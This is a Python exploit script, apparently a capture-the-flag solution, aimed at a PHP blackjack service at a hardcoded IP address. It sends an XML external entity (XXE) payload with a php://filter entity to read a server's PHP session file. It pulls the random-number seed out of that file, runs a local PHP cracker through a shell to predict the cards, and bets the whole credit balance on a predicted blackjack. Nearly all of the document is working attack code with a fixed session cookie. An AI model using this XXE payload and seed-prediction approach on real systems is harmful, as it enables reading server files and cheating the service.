import requests
import base64
import subprocess

def leak(idx):
	header= {"Content-Type":"text/xml"}
	data = '<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_{}"> ]><xml><suit>S</suit><rank>&ent;</rank><meta><width>150</width><height>200</height><type>json</type><mime>image/jpeg</mime></meta></xml>'.format(idx)
	ret2 = r.post("http://110.10.147.91/render.php", headers=header,data=data)
	b64e = ret2.json()['image']['artifacts']['MVG'].split(" 'S-")[1].split("'")[0]
	rr = base64.b64decode(b64e).decode()
	return rr.split("seed|i:")[1].split(";")[0] # seed

def go():
	ret2 = r.get("http://110.10.147.91/blackjack.php?action=start")
	my = ret2.json()
	print(my)
	credit = my['credit']

	seed = leak(sessid)
	print(seed)

	crack = subprocess.check_output("php ./crack.php {}".format(seed), shell=True)
	print(crack)
	crack = crack.decode().split(",")
	crack.pop()

	me = []
	com = []

	me.append(int(crack.pop(0)))
	com.append(int(crack.pop(0)))
	me.append(int(crack.pop(0)))

	print(me, sum(me))
	print(com, sum(com))
	if sum(me) == 11 and len(me) == 2 and 1 in me: # blackjack
		bet(credit)
		return True

def bet(credit):
	bet_ret = r.get("http://110.10.147.91/blackjack.php?action=bet&amount={}".format(credit))
	print(bet_ret.text)
	stay_ret = r.get("http://110.10.147.91/blackjack.php?action=stay")
	print(stay_ret.text)
	done_ret = r.get("http://110.10.147.91/blackjack.php?action=done")
	print(stay_ret.text)

sessid = "v9qotpr8776t77tcov0hksurl2"
r = requests.session()
r.headers.update({'Cookie': 'PHPSESSID={}'.format(sessid)})
print(sessid)
while True:
	if True == go():
		break